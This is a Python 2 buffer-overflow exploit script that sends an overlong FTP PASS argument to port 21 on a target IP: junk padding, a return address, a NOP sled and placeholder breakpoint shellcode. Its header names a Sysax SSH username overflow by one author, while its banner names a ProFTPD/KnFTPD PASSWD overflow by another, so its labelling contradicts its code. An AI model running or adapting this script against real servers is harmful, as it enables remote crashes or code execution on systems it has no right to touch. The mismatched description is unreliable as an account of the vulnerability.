#!/usr/bin/python
##########################################################################################################
#Title: Sysax <= 5.53 SSH Username BoF Pre Auth RCE (Egghunter)
#Author: Rio Atmadja
#OS Tested: XP SP3 32bit
##########################################################################################################
import sys,socket
 
print "============================================================================"
print "                         ProFTPD or KnFTPD PASSWD BOF                       "
print "                                  by orion                                  "
print "============================================================================"

if len(sys.argv) !=2:
    print "[*] Usage: %s <ip address > " % sys.argv[0]
    sys.exit(0)
 
target = sys.argv[1]

shellcode = '\xcc' * 500
buffer = '\x41' * 284 + "\xd3\x31\xc1\x77" + '\x90' * 16 + shellcode 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to %s on port %d" % (target,21)
print "[+] Sending Evil buffer --> " + str(len(buffer)) + " Bytes"
try:
    s.connect((target,21))
    print "[+] Sending payload"
    s.send("USER anonymous \r\n")
    s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    s.recv(1024)
    s.close()
    print "[+] Payload sent successfully"
    raw_input("[+] Press any key to exit\n")

except:
    print "[+] Could not connect to %s!" % target
    sys.exit(0)
